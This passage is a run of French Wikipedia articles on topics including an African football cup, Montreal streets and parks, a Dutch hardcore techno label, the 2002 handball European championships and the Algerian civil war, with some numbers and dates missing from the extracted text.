À partir de 1993, les clubs d'Afrique du Nord vont reprendre la main sur la compétition et accumuler les titres. En 1993, Al Ahly SC remporte la finale face au tenant du titre, le club de Côte d'Ivoire d'Africa Sports et devient le club le plus titré de l'histoire de la compétition avec 4 trophées. La finale suivante reste la seule de cette période (avec celle de 2001) à ne compter aucun club d'Afrique du Nord (Algérie, Maroc, Tunisie ou Égypte). Pour le reste, après le succès de la JS Kabylie en 1995, l'Égypte va glaner deux autres trophées avec Arab Contractors, titré pour la troisième fois en 1996 et le Zamalek, vainqueur en 2000. La Tunisie remporte trois titres (deux pour l'ES Sahel en 1997 et 2003 et un pour l'ES Tunis en 1998). Enfin, le Maroc remporte le seul trophée de son histoire par le Wydad AC, vainqueur en 2002.
Format.
Seuls les vainqueurs des coupes nationales des associations membres sont éligibles pour participer à la compétition si et seulement s'ils ne participent pas en tant que vainqueurs de ligue à la Ligue des champions de la CAF. Les vainqueurs des Coupes de la Ligue organisées dans certains pays ne furent jamais autorisés à participer à la Coupe des vainqueurs de coupe. La compétition est réservée à un club par membre de la CAF.
Tous les tours de la compétition, y compris la finale, sont joués selon le système à élimination directe en aller-retour, l'équipe ayant cumulé le plus de buts pour elle l'emporte. En cas d'égalité, la règle des buts marqués à l'extérieur s'applique ; et si elle ne donne rien le match retour est augmenté d'une séance de tirs au but.
Le vainqueur de la Coupe d'Afrique des vainqueurs de coupe est directement qualifié pour l'édition de la saison suivante. Il rencontre également depuis 1993, le vainqueur de la Ligue des champions lors de la Supercoupe de la CAF.

</doc>
<doc id="568304" url="https://fr.wikipedia.org/wiki?curid=568304" title="Rue Le Royer (Montréal)">
Rue Le Royer (Montréal)

La rue Le Royer est une voie de Montréal.
Situation et accès.
Cette rue du Vieux-Montréal est située au sud-est de la Basilique Notre-Dame, dans l'emplacement de l'ancien Hôtel-Dieu. 
Elle est aujourd'hui composée de deux tronçons distincts. Le premier (rue Le Royer ouest) est situé entre le boulevard Saint-Laurent et la rue Saint-Jean-Baptiste. Le secteur ouest de la rue a été fermé à la circulation pour devenir "Les Cours Le Royer" et est donc aujourd'hui un corridor piéton. La seconde partie (rue Le Royer est) relie la place Jacques-Cartier à la rue Saint-Claude. 
Origine du nom.
Son nom fait référence à Jérôme Le Royer, fondateur de Hospitalières de Saint-Joseph.
Historique.
Au milieu du , Montréal connaît un essor économique qui renforce la fonction commerciale du centre et entraîne la réaffectation des immeubles et des terrains. Parmi les institutions les plus sensibles à ces changements se trouvaient les communautés religieuses installées dans la vieille ville depuis le . À cette époque, les Hospitalières de l'Hôtel-Dieu décident de déménager leur hôpital à l'extérieur du centre-ville afin de trouver un endroit plus sain et moins bruyant. Sur le terrain de leur ancien hôpital, elles font construire, à partir de 1861, un ensemble d'entrepôts qu'elles louent à des entreprises diverses. À l'intérieur de ce complexe, les Hospitalières font tracer trois rues: la rue de Brésoles, la rue Le Royer et la rue Saint-Dizier, qu'elles cèdent à la Ville de Montréal en 1871.
La rue Le Royer, entre la rue Saint-Dizier et la rue Saint-Sulpice, est le tronçon initial d'une rue projetée entre la rue Saint-Sulpice et la rue Saint-Claude mais dont le projet complet ne sera jamais réalisé. Le tronçon entre la place Jacques-Cartier et la rue Saint-Claude est ouvert en 1889 à la suite d'une série des transactions, tandis qu'une section au milieu, entre Saint-Dizier et Saint-Jean-Baptiste, n'est ouverte qu'en 1913 lors de la démolition du couvent de la Congrégation de Notre-Dame.
Le tronçon ouest est fermé à la circulation en 1982 lors de l'aménagement d'un projet résidentiel de recyclage et rénovation impliquant les anciens magasins de l'Hôtel-Dieu. Il porte depuis le nom de "Cours Le Royer".

</doc>
<doc id="568305" url="https://fr.wikipedia.org/wiki?curid=568305" title="Barrage de Kaprun">
Barrage de Kaprun

Le barrage de Kaprun est un barrage hydroélectrique célèbre et spectaculaire situé à Kaprun de la région du Pinzgau dans le land de Salzbourg en Autriche. Sa construction se fit de 1938 à 1951. 

</doc>
<doc id="568308" url="https://fr.wikipedia.org/wiki?curid=568308" title="Masters of Hardcore">
Masters of Hardcore

Masters of Hardcore, souvent abrégé MOH ou M.O.H., est un label néerlandais de techno hardcore. Masters of Hardcore est également décliné en festival indépendant et sous forme d'une série de compilations. Fondé en 1995 par Outblast (label) et King Matthew (festivals), le label est, peu après sa création, pris à partie par les politiciens et médias locaux lors de prises de position politiques. Cependant, Masters of Hardcore s'oppose au racisme adopté par une minorité des gabbers, à la répression des autorités qui considèrent le mouvement techno hardcore comme étant dangereux pour la jeunesse, mais aussi au populisme qui à cette époque s'intensifie aux Pays-Bas sous l'impulsion de Pim Fortuyn.
Des années plus tard, le label renaît sous l'influence des nouveaux artistes. Masters of Hardcore fait partie intégrante des labels majeurs du domaine gabber basés aux Pays-Bas et dans le monde entier. Le label possède ses propres médias - albums et compilations, produits dérivés (vêtements, posters, DVD), ventes de morceaux musicaux par Internet et sa propre radio en direct. De plus, le label organise annuellement ses soirées indépendantes, principalement aux Pays-Bas et en Belgique. Au fil de son existence, le label a vu et voit passer de nombreux artistes et groupes à la notoriété internationale tels que notamment Angerfist, Endymion, Tha Playah, et The Stunned Guys.
Le festival, organisé aux côtés de Art of Dance, est considéré par la presse spécialisée comme le plus grand événement de hardcore au monde.
Histoire.
Débuts et déclin.
Masters of Hardcore est originellement fondé en 1995 par Marc Out et Matthijs Hazeleger. Le label émerge en réponse au déclin de la scène gabber et de sa musique, causé par sa diabolisation générale par les politiciens et médias locaux. D'après son site officiel, le manifeste du label est explicite : ).
La première sortie du label est un vinyl du même nom « Masters of Hardcore » incluant deux compositions de Bass-D and King Matthew, Rob Gee et DJ J.D.A, publié en avril 1996. Aux alentours de 1998, la scène hardcore atteint un point critique - les labels majeurs n'étaient plus inspirés dans la production de ce style musical et bon nombre d'entre eux tentaient d'organiser des événements dance et trance ; au prix de longues batailles juridiques, une soirée MOH est alors organisée : les prévues sont vendues. Les premières compilations "" se vendent à : aucun grand succès ne se fait pour le moment ressentir, mais le label gagne en indépendance. MOH s'agrandit alors avec l'arrivée d'autres artistes ayant précédemment beaucoup contribué au succès des festivals Thunderdome et de leurs compilations homonymes ; ces artistes incluent notamment Buzz Fuzz, DJ Paul et The Prophet. Dès 1999, Masters of Hardcore gagne de l'ampleur et une capacité maximum de près de assiste à leurs soirées.
Retour et popularisation.
Grâce à l'influence de nombreux artistes, Masters of Hardcore devient plus actif au début de l'année 2000, paradoxalement alors que la scène musicale gabber est à un stade critique. Ce n'est qu'au plus tard des années 2000 que Masters of Hardcore gagne en popularité avec l'émergence d'Internet (notamment, grâce aux comptes de réseaux sociaux faisant la promotion du label et de ses artistes). De nouveaux artistes font leur apparition comme Danny Masseling en 2002, alors sous le nom de Kid Morbid, et DaY-már en 2005 qui fera ses débuts dans la radio officielle du label. En 2004, le label fait paraître le DVD '. Dès 2005, en réponse aux critiques politiques et médiatiques à l'encontre de la scène gabber, MOH organise des soirées contre le racisme et le fascisme ; c'est à cette même période que le label fait paraître l'EP intitulé '. En 2008, le label joue au TT-Hall Assen devant plus de . En 2006, le label fait paraître le DVD de son événement ', bien accueilli avec une note de 70/100 sur Partyflock. En 2007, il fait paraître le DVD de son événement ', également bien accueilli avec une note de 70/100 sur Partyflock.
En , la dernière compilation du label intitulée ' est publiée. La même année, le label organise l'événement ' composé notamment de Korsakoff, Amnesys et Dyprax. Toujours en 2010, MOH annonce l'édition ", pour la célébration de sa quinzième année d'existence. À cette occasion, une bande-annonce est mise en ligne et annonce l'événement pour le .
Le seizième festival MOH, intitulée ', se déroule le à Anvers, en Belgique ; durant cet événement, Angerfist fait la promotion de son nouvel album intitulé '. Par ailleurs, en à peine une journée, l'événement affiche complet. Du 24 au , la dix-septième édition du festival ' se déroule au Lotto Arena d'Anvers en Belgique. Le , la page officielle Facebook du label atteint . Début 2014, le label annonce son retour à Bois-le-Duc avec un event appelé '. Après la refonte du contexte économique événementiel aux Pays-Bas en 2013, et à la suite du rachat d'ID&amp;T, Masters of Hardcore s'impose désormais comme le principal label gabber au monde, selon le DJ Partyraiser.
En 2015, le festival célèbre ses d'existence sous le titre '. Le label ouvre l'année 2016 avec son édition '.
Pour l'année 2019, plusieurs éditions du festival s'ouvrent : une en Autriche, une en Russie, une en Écosse (le ), et une en Suisse (le ) ; cette même année s'ouvre l'édition ".
Continuité.
L'édition 2020 du festival, qui devait normalement célébrer les d'existence du label, se retrouve annulée à cause de la pandémie de Covid-19, mais est remplacée par un ' intitulé '. L'édition 2021 est également annulée, mais l'expérience d'un "" en réalité virtuelle est annoncée via un projet baptisé Pythian le . En 2022, Masters of Hardcore devient le premier événement de hardcore à réorganiser ses dispositifs où les visiteurs peuvent venir sans obligation de montrer un test PCR négatif.
Le label annonce en janvier son édition 2024 nommée "" avec notamment Paul Elstak, DJ Mad Dog et Nosferatu pour le .

</doc>
<doc id="568310" url="https://fr.wikipedia.org/wiki?curid=568310" title="Championnat d'Europe masculin de handball 2002">
Championnat d'Europe masculin de handball 2002

Le Championnat d'Europe masculin de handball s'est déroulé en Suède du 25 janvier au .
A domicile, la Suède fait naturellement figure de favori et ne rate pas l'occasion de permettre à Magnus Andersson, Martin Frändesjö, Ola Lindgren, Stefan Lövgren, Staffan Olsson et Magnus Wislander de remporter leur quatrième titre de champion d'Europe. La présence en demi-finale de l'Allemagne (médaillé d'argent après amené les Suèdois en prolongation), du Danemark (médaillé de bronze) et de l'Islande (porté par Ólafur Stefánsson qui termine meilleur buteur) illustre un certain renouveau. En revanche, la France, championne du monde en titre, et la Russie, championne olympique en titre, doivent se contenter du match pour la cinquième place au profit des seconds.
Présentation.
Équipes qualifiées.
Cinq équipes sont directement qualifiées pour la compétition : le pays organisateur et les quatre premières équipes du Championnat d'Europe 2000.
Les autres équipes doivent passer par les qualifications qui se déroulent en deux phases :
Ainsi, les 16 équipes qualifiées sont :
Remarque : le vainqueur de l'édition est indiqué en gras et le pays hôte en "italique".
Modalités.
Lors du tour préliminaire, les 16 équipes qualifiées sont réparties en 4 poules de 4 équipes. Les trois premières équipes sont qualifiées pour le tour principal et les équipes classées quatrième sont éliminées.
Lors du tour principal, les équipes sont répartis en 2 groupes de 6 équipes. Les deux meilleures équipes de chaque groupe se qualifient pour les demi-finales. Les autres équipes s'opposent deux à deux lors des matchs de classement : les troisièmes de chaque poule jouent le match pour la , etc.
Phase finale.
Matchs de classement.
Match pour la 
Match pour la 
Match pour la 
Match pour la 
Classement final.
Les trois premiers, c'est-à-dire la Suède, l'Allemagne et le Danemark, sont qualifiés pour le Championnat du monde 2003. Ces trois nations ainsi que l'Islande et la Russie sont qualifiés pour le Championnat d'Europe 2004.
Statistiques et récompenses.
Équipe-type.
L'équipe-type du championnat d'Europe 2002 est :
Effectif des équipes sur le podium.
Champion d'Europe :.
L'effectif de la Suède, championne d'Europe, est :
Vice-champion d'Europe :.
L'effectif de l'Allemagne, vice-championne d'Europe, est :
Troisième place :.
L'effectif du Danemark, médaillé de bronze, est :

</doc>
<doc id="568311" url="https://fr.wikipedia.org/wiki?curid=568311" title="Championnat d'Europe féminin de handball 2002">
Championnat d'Europe féminin de handball 2002

La du Championnat d'Europe féminin de handball s'est déroulé du au au Danemark, six ans après la deuxième édition.
Premier championnat d'Europe organisé avec 16 équipes, la compétition est composée d'un tour préliminaire, d'un tour principal et d'une phase finale à quatre. Le Danemark et la Norvège se défient une troisième fois en finale et le titre tombe dans l'escarcelle danoise (25-22). L'équipe de France remporte sa première médaille européenne, le bronze, face à la Russie (27-22). Pour la première fois une Française, Stéphanie Cano, apparaît dans l'équipe type, en tant que meilleure ailière droite tandis que la Danoise Karin Mortensen est sacrée MVP. Avec 58 buts marqués, le Hongroise Ágnes Farkas termine meilleure marqueuse pour la seconde fois.
Présentation.
Sites.
La compétition s'est déroulée sur trois sites :
Qualifications.
Douze pays participent à la compétition :
Remarque : le vainqueur de l'édition est indiqué en gras et le pays hôte en "italique".
Statistiques et récompenses.
Équipe-type.
À l'issue du tournoi, l'équipe type du tournoi a été désignée :
Statistiques.
Les meilleures marqueuses sont :
Les meilleures gardiennes de but sont :
Effectifs des équipes sur le podium.
Championne d'Europe :.
L'effectif du Danemark au championnat d'Europe 2002 est :
Vice-championne d'Europe :.
L'effectif de la Norvège au championnat d'Europe 2002 est :
Troisième place :.
L'effectif de la France au championnat d'Europe 2002 est :

</doc>
<doc id="568312" url="https://fr.wikipedia.org/wiki?curid=568312" title="Saison cyclonique 2007 dans l'océan Atlantique nord">
Saison cyclonique 2007 dans l'océan Atlantique nord

La saison 2007 des ouragans (cyclones tropicaux dans l'océan Atlantique) était prévue durer du au , selon la définition de l'Organisation météorologique mondiale.
Bilan.
Description de la saison.
2007 compte 2 ouragans de catégorie 5, ce qui reste un événement rare. 2005 avait connu 4 catégorie 5, 1961 et 1960, à égalité avec 2007, avaient connu 2 ouragans de catégorie 5.
Noms des tempêtes 2007.
La liste des noms utilisée pour nommer les tempêtes et les ouragans pour 2007 était exactement la même que celle de 1997, à l'exception d’"Andrea", d’"Ingrid" et de "Melissa" qui ont remplacé les noms Allison, Iris et Michelle.
Andrea, Ingrid,et Melissa furent utilisés pour la première fois lors de cette année 2007. Ceux en "gris" n'ont pas été utilisés. À la suite des dégâts importants qu'ils ont causés et selon la tradition, les noms Dean, Felix et Noel ont été retirés pour être remplacés par "Dorian", "Fernand" et "Nestor" en 2013.
Classification.
Les deux tableaux ci-dessous donne le classement des différentes tempêtes de 2007. Le premier donne leur énergie selon l'algorithme "Accumulated Cyclone Energy" (ou ACE) du National Weather Service qui est en gros une mesure de l'énergie dégagée instantanément multipliée par sa durée de vie. Le second montre le nombre de morts causés par chacun.

</doc>
<doc id="568317" url="https://fr.wikipedia.org/wiki?curid=568317" title="Andrew File System">
Andrew File System

Andrew File System ou AFS est un système d'archivage distribué inspiré de NFS, et créé à l'université Carnegie-Mellon. Son nom vient de Andrew Carnegie et Andrew Mellon.
Héritage.
NFSv4 a été fortement inspiré à son tour par AFS. DCE Distributed File System (DCE/DFS) est une variante adoptée en 1989 par l'Open Software Foundation pour une partie de leur environnement informatique distribué.

</doc>
<doc id="568321" url="https://fr.wikipedia.org/wiki?curid=568321" title="Tayuya">
Tayuya

 est un personnage du manga "Naruto".
Elle fait partie des 4 ninjas du Son. Elle se considère comme la meneuse des 4, et agit sans arrêt en conséquence (bien que ce soit Sakon le plus puissant du quartet). Elle est vantarde, et arrogante. Il ne faut pas se fier à son joli visage. Elle est plutôt forte et rapide. Sa seule arme est une flûte enchantée qui lui permet de contrôler des esprits ou des corps, ainsi que de créer des illusions. Elle possède le sceau maudit d'Orochimaru, qui lui procure une force exceptionnelle dans les combats difficiles. Elle affronte Shikamaru en duel après que Sasuke a quitté Konoha.
Après un combat acharné elle prendra l'avantage sur lui mais l'arrivée de Temari renverse la situation. En effet, Temari maîtrisant le vent, Tayuya la considère comme l'ennemie destinée du Son : le vent peut à la fois causer des dommages physiques et disperser les sons.
Temari vient à bout de Tayuya grâce à une invocation, Kirikiri No Mai « La Danse du Faucheur », Kamatari, une belette dotée d'une faux gigantesque, apparaît et coupe une énorme partie de la forêt. Tayuya meurt écrasée sous les arbres.

</doc>
<doc id="568326" url="https://fr.wikipedia.org/wiki?curid=568326" title="Parc du Mont-Royal">
Parc du Mont-Royal

Le parc du Mont-Royal est l'un des espaces verts les plus importants de Montréal. Il protège le mont Royal de développements urbains plus étendus. Le parc, créé en 1876, est considéré comme étant la plus ancienne aire protégée du Québec.
Histoire.
C'est en 1853 que le conseiller a proposé de préserver la montagne. Afin d'appuyer sa démarche, le colonel Stevenson fait tirer plusieurs salves d'un canon qu'il fait transporter sur le mont Royal afin de contredire ceux qui le prétendent inaccessible. Durant l'hiver 1862-1863, l'abattage de plusieurs arbres par un dénommé Lamothe sur son terrain au nord de la rue Peel incite finalement la ville à passer à l'action et à acquérir les terrains sur la montagne afin de les convertir en parc.
Le parc majoritairement boisé fut aménagé par Frederick Law Olmsted, paysagiste du Central Park à New York. Le projet d'Olmsted s'inspire de la topographie naturelle du site, le divise en plusieurs secteurs et le dote de deux belvédères. Il rencontre plusieurs oppositions, notamment de la part de ceux qui souhaitent une vocation et un développement plus urbains. Le parc est finalement inauguré le après que la ville eut investi un million de dollars pour l'acquisition des terrains et leur aménagement.
Le parc fut gravement touché par la tempête de verglas de 1998, mais a par la suite regagné son ancienne gloire. 
Protection de l’environnement.
En 2005, une section de du parc fut reconnue comme l'habitat floristique du Parc-du-Mont-Royal. Cette petite aire a pour mission de protéger la , plante menacée au Québec.
La Montagne du Mont-Royal abrite plusieurs plantes menacées ou en voie de disparition tel que la sagunaire du Canada, l’Uvulaire à grandes fleurs, le Trille blanc, la Matteucie ou fougère à l’autruche (préférence Félix Pompré, le ParcduMont-Royal en mission pour protéger des plantes menacées, dans le journal La Presse du 29 juillet 2024, www.LaPresse.ca ). Un inventaire des plantes est réalisé annuellement. Ainsi en bordure des sentiers officiels , des petites clôtures ont été installées depuis 2021 afin de limiter les sentiers informels et de diminuer le piétinement des humains sur la a végétation (référence Félix Rompré, item ). 
Aménagement.
Le parc contient deux belvédères, dont le plus important est le belvédère Kondiaronk (celui du Chalet du Mont-Royal) surplombant le centre-ville. 
Parmi les autres attraits, on compte notamment la croix du mont Royal, le lac aux Castors, une butte de glissade, une glyptothèque extérieure, le centre d'interprétation de la Maison Smith, des œuvres du en 1964, un petit monument à Simon McTavish (le long du mur d'enceinte de l'Hôpital Royal Victoria) et un monument très connu à Sir George-Étienne Cartier.
Des sentiers relient ces lieux à différents points d'entrée dans le parc. Certains points d'accès sont pavés, comme celui à partir de la rue Duluth. D'autres sont à même la terre, comme le chemin de l'Escarpement, sur le versant est de la montagne. Un assez long escalier donne aussi accès au parc à partir de la rue Peel et mène au belvédère Kondiaronk.
Chemin Olmsted.
Un des éléments majeurs du parc est le long sentier qui le traverse et permet d'accéder au sommet ainsi qu'aux belvédères, le chemin Olmsted. Il prend sa source au pied du monument à Sir George-Étienne Cartier et serpente en pente douce jusqu'au lac aux Castors. Il se divise en trois sections définies par Olmsted lui-même :
Événements et activités.
Saison estivale.
C'est au pied du monument à Sir George-Étienne Cartier qu'ont lieu diverses manifestations culturelles, dont les Tam-Tams, une réunion informelle tenue à chaque fin de semaine pendant l'été, où on joue des tambours. Les gens s'y rassemblent pour danser au rythme des djembé tam-tams.
Un peu plus haut, on peut voir les "Guerriers de la montagne" qui, après 10 ans de simulation de combat, sont devenus la référence en la matière à Montréal. 
On y trouve également un petit marché d'objet artisanaux.
Saison hivernale.
Le parc permet la pratique de sports d'hiver, la traîne sauvage, le ski de fond, la raquette, le jogging d'hiver et le patin. Une patinoire réfrigérée a été aménagée en 2006 près du Lac-aux-Castors. 

</doc>
<doc id="568327" url="https://fr.wikipedia.org/wiki?curid=568327" title="Old Pulteney">
Old Pulteney

Old Pulteney est une distillerie de whisky située à Wick dans les Highlands en Écosse. À l’exception des deux distilleries des îles Orcades, Old Pulteney est la plus septentrionale des distilleries écossaises.
Même si elle était située sur le continent, au moment de sa création en 1826, la distillerie n’était pas accessible par voie de terre. Elle était approvisionnée en céréales par bateaux et le whisky était emmené de la même façon. À cette époque, la plupart des travailleurs de la distillerie étaient aussi des pêcheurs.
La distillerie est aujourd’hui la propriété de Inver House Distillers qui possède aussi Glenlivet ou Balblair. Elle possède 1 "wash still" et 1 "spirit still" et produit environ 1 million de litres d’alcool pur par an.
Old Pulteney produit un single malt vendu tant en version officielle que par des embouteilleurs indépendants :

</doc>
<doc id="568337" url="https://fr.wikipedia.org/wiki?curid=568337" title="Décennie noire">
Décennie noire

La guerre civile algérienne ou décennie noire (également appelée années de plomb ou années noires) est une guerre civile qui oppose entre 1992 et 2002 le gouvernement de l'Algérie (dirigé par le Haut Comité d'État), disposant de l’Armée nationale populaire (ANP), et divers groupes islamistes et rebelles, représentés notamment par le Front islamique du salut (FIS). Le conflit s'achève par la victoire des forces gouvernementales avec la reddition de l'Armée islamique du salut (AIS) et la défaite du Groupe islamique armé (GIA). En dix ans, les violences font entre et , ainsi que des milliers de disparus, un million de personnes déplacées, des dizaines de milliers d'exilés et plus de vingt milliards de dollars de dégâts.
Le conflit commence en , quand le gouvernement algérien, craignant de perdre le pouvoir à l'issue des premières élections législatives libres, interrompt le processus électoral au vu des résultats du premier tour laissant clairement augurer une victoire du Front islamique du salut (FIS) et la mise en place d'une république islamique. Après l'interdiction du FIS et l'arrestation de milliers de ses membres, différents groupes de guérilla islamiste émergent rapidement. Ils se constituent en plusieurs groupes armés, dont les principaux sont le Mouvement islamique armé (MIA), basé dans les montagnes, et le Groupe islamique armé (GIA), basé dans les villes. Les islamistes visent au commencement l'armée et la police, mais certains groupes s'attaquent rapidement aux civils. En 1994, tandis que des négociations ont lieu entre le gouvernement et les dirigeants du FIS mis en résidence surveillée, le GIA déclare la guerre au FIS et à ses partisans, alors que le MIA et divers groupes plus petits se regroupent pour former l'Armée islamique du salut (AIS), affiliée au FIS.
En 1995, les pourparlers échouent et une nouvelle élection a lieu, remportée par le candidat de l'armée, le général Liamine Zéroual. Le conflit entre le GIA et l'AIS s'intensifie. Au cours des années suivantes, le GIA commet une série de massacres visant des villages entiers, avec un pic en 1997 autour des élections parlementaires, qui sont remportées par un parti nouvellement créé favorable à l'armée, le Rassemblement national démocratique (RND). L'AIS, soumise à des attaques des deux bords, opte en 1997 pour un cessez-le-feu unilatéral avec le gouvernement, alors que le GIA se déchire à la suite de sa nouvelle politique de massacres. En 1999, l'élection d'un nouveau président, Abdelaziz Bouteflika, est suivie d'une loi amnistiant la plupart des combattants, ce qui génère le retour à un calme relatif. La violence diminue sensiblement avec la victoire du gouvernement mais pas totalement. Les derniers éléments du GIA proprement dit apparaissent comme ayant pratiquement disparu en 2002.
Cependant, un groupe dissident du GIA, le Groupe salafiste pour la prédication et le combat (GSPC), basé principalement à la périphérie de la Kabylie, était constitué en 1998, se dissociant des massacres. Visant principalement l'armée et la police, il rejette l'amnistie et poursuit son combat. En 2013, ses activités comparativement clairsemées sont les seuls combats persistant en Algérie.
Libéralisation et prélude à la guerre.
Libéralisation et victoire électorale du FIS, 1990.
À la fin de 1988, le Front de libération nationale (FLN), parti unique en Algérie dont le pouvoir était resté inébranlé depuis les années 1960, ne semblait plus adapté à la situation. Plusieurs éléments ont mené à une insatisfaction croissante de la population. Tout d'abord, un système de parti unique basé sur la démocratie populaire mais cachant en réalité un régime militaire, touché par la corruption et le clientélisme. En effet, les années 1980 avaient vu trois organes de pouvoir différents : la présidence, le parti et l'armée. Ensuite, les chutes du prix du pétrole en 1986 qui font passer le prix du baril de à . Le gouvernement bénéficiait du prix élevé du pétrole : celui-ci représentait 95 % des exportations algériennes et 60 % du budget du gouvernement. L'économie planifiée subit de fortes contraintes, avec les pénuries et la montée du chômage. En , des manifestations contre le président Chadli Bendjedid eurent lieu à Alger et sa périphérie essentiellement, mettant en avant la montée de l'islamisme parmi nombre de manifestants. L'armée, en tirant sur les manifestants, fit plus de 500 morts et choqua la population par la brutalité de la réponse.
La réponse du président fut d'entreprendre une réforme. Le , il proposa une nouvelle constitution par voie référendaire qui supprimait le parti unique, la référence au socialisme, et instaurait les libertés d'expression, d'association et de réunion. La cour de Sûreté de l’État chargé de punir les « déviances politiques » est supprimée. L’État algérien socialiste disparaît au profit de la nouvelle République populaire et démocratique. Des trois centres de pouvoir évoqués plus haut, seule la présidence conserve son pouvoir, alors que le parti du FLN n'est même pas nommé dans la Constitution et que l'armée n'a plus le droit de participation à la vie politique algérienne. Au début de l'année 1991, trente-trois partis de très divers courants politiques obtinrent une existence légale, parmi eux le Front des forces socialistes, le Rassemblement pour la culture et la démocratie, le Parti social-démocrate, mais aussi et surtout le Front islamique du salut (FIS).
À ses débuts, le FIS incorpore un large spectre de la mouvance de l'opinion islamiste, des plus radicaux au plus modérés représentée par ses deux principaux dirigeants. Son président, Abbassi Madani, professeur et combattant à l'époque de l'indépendance, représentait un conservatisme religieux relativement modéré et symboliquement lié à la guerre d'indépendance algérienne, source de la légitimité du FLN à diriger le pays ; il manifestait un attachement tiède à la démocratie, et plaçait la charia au-dessus de cette dernière. Le vice-président, Ali Belhadj, plus jeune et d'un niveau d'instruction moindre, avait reçu une éducation en arabe dans des écoles islamiques et était prédicateur à Alger. Tenant d'une ligne salafiste, il était connu pour ses prêches radicaux et agressifs qui rassemblaient la jeunesse ouvrière déçue et les non-islamistes alarmés par le rejet de la démocratie et des opinions islamistes conservatrices envers les femmes. Belhadj et Madani avaient tous deux des visions différentes de ce que devait être un État islamique, ils réussirent à travailler efficacement ensemble. De fait, le FIS devint rapidement de loin le plus grand parti islamiste, avec un énorme électorat particulièrement concentré dans les zones urbaines. Le , il remporta les élections locales avec 54 % des voix, il fait ainsi le double du score du FLN. Des analyses ont révélé que l'électorat du FIS était surtout la jeunesse défavorisée des bidonvilles et éduquée en arabe, produit de la croissance démographique exponentielle. Les victoires locales du FIS dans plusieurs des municipalités permettent à la population d'expérimenter la gestion politique locale du FIS. Beaucoup d'Algériens se disent d'ailleurs surpris de voir une gestion aussi efficace que juste, en comparaison de celle corrompue et inefficace du FLN. Pour autant, certains Algériens ont été alarmés de voir de nouvelles pratiques apparaître sous la gestion locale du FIS : entre autres, le port obligatoire du voile pour les employées municipales, ou encore l'interdiction de magasins vendant de l'alcool. La guerre du Golfe renforça le parti, car il surpassait l'opposition du gouvernement à l'opération "Tempête du désert".
Par ailleurs, la fin des années 80 est marqué par le fait que trois à quatre mille volontaires algériens, encouragés par des organisations intégristes, partent au Pakistan et en Afghanistan mener le djihad contre l'occupant soviétique. Pour Rhéda Malek, c'est l'apport massif de ces éléments soigneusement formés et aguerris en Afghanistan qui donnera consistance au projet islamiste en Algérie.
En , le gouvernement décida d'un nouveau découpage des circonscriptions électorales. Les circonscriptions étaient arrangées de telle sorte qu'elle favorisaient les régions rurales du sud et de l'est où le FLN conservait une majorité législative. En , le FIS appela à une grève pour protester contre ce nouveau découpage des circonscriptions électorales par le gouvernement, dénonçant un charcutage électoral. La grève elle-même fut un échec, mais les énormes manifestations organisées par le FIS à Alger furent efficaces parce qu'elles représentaient une menace pour l'autorité de l’État ; le FIS accepta d'arrêter la grève en juin en échange d'élections équitables. Peu après le gouvernement, de plus en plus alarmé, arrêta Madani et Belhadj (ils furent condamnés à 12 ans de prison) ainsi qu'un certain nombre d'autres membres appartenant à des échelons inférieurs du FIS, sans pour autant dissoudre le parti. Le FIS resta légal, et Abdelkader Hachani en prit le contrôle.
La progression du parti se poursuivit. Il participe aux élections suivantes, après l'expulsion de personnes telles que Saïd Mekhloufi, qui avait préconisé l'action directe contre le gouvernement. Mais les tendances du « djihad immédiat », composées d’anciens partisans de Mustapha Bouyali, de vétérans d’Afghanistan et d’éléments du Takfir wal Hijra qui avaient entrepris clandestinement la mise en place des premiers noyaux de groupes armés en utilisant le cadre légal offert par le FIS, n’ont pas attendu ces événements pour se lancer dans les actions armées. Ainsi, de nombreuses opérations ont été menées durant la période de grève insurrectionnelle de juin 1991 et même avant. À la fin novembre, des islamistes armés proches du mouvement extrémiste Takfir wal Hijra attaquèrent un poste frontalier à Guemmar, annonçant le conflit à venir ; ailleurs, un calme tendu régnait. La participation du FIS aux élections législatives n’a aucune influence sur la détermination de ces tendances du djihad immédiat à entamer l’action armée pour l’instauration d’un État islamique.
Le , le résultat des législatives est un choc pour les représentants politiques algériens. Malgré 39 % d'abstention, le FIS gagne facilement le premier tour des élections à l'assemblée nationale algérienne avec 48 % des votes, remportant 118 des 232 sièges avec un taux de participation de 59 %. Immédiatement, des accusations de sabotage sont lancées notamment par le gouvernement et le FLN. Beaucoup d'individus n'ayant pas voté pour le FIS ont affirmé qu'ils avaient eu des difficultés à obtenir leur carte électorale. Quoi qu'il en soit la victoire du FIS au second tour et la nomination d'un gouvernement dominé par le FIS semblaient alors inévitables.
Coup d'État et annulation des élections.
La victoire du FIS aux élections législatives de 1991 crée une véritable division au gouvernement sur la marche à suivre. La véritable question qui se pose est la suivante : doit-on, ou non, accepter de gouverner avec le FIS quand il obtiendra la majorité aux élections législatives ? Le gouvernement est divisé. De son côté, le président Bendjedid pense pouvoir utiliser son statut de Chef d’État pour contrôler et tempérer les éventuels excès des députés du FIS. En fait, il souhaite à tout prix continuer sur la lancée de démocratisation de la société. D'un autre côté, le premier ministre Ghozali ainsi que certains généraux (Nezzar et Belkheir) refusent catégoriquement de laisser le pouvoir législatif aux députés du FIS et veulent à tout prix conserver la tradition nationaliste et laïque du régime algérien. Très vite, au début du mois de janvier, les opposants à Chedli Bendjedid, ainsi que quelques chefs militaires décident de couper court au débat et d'imposer leur décision au Président.
Le , sous le coup de force de ces généraux et chefs militaires dits « janviéristes », l'armée annule les élections, forçant le président Chadli Bendjedid à démissionner lors d'un discours télévisuel. Le , les généraux "janviéristes" décident de transférer le pouvoir présidentiel à un Haut Comité de Sécurité qui devait servir de comité de conseil présidentiel. Le lendemain, ce comité décide d'annuler les élections législatives et de créer le Haut Comité d’État (HCE) qui est une présidence collégiale opérant jusqu'à la fin du mandat de Bendjedid, en . Le HCE rappelant de son exil le combattant de l'indépendance Mohammed Boudiaf comme nouveau président de la nouvelle autorité politique chargée de diriger l’État : le Haut Comité d’État. Pour les chefs du coup d'État, Boudiaf était le meilleur choix, d'une part par sa légitimité acquise lors de la guerre d'indépendance, et d'autre part, parce que sa réputation n'avait pas été touchée par les crises politiques de l'Algérie indépendante.
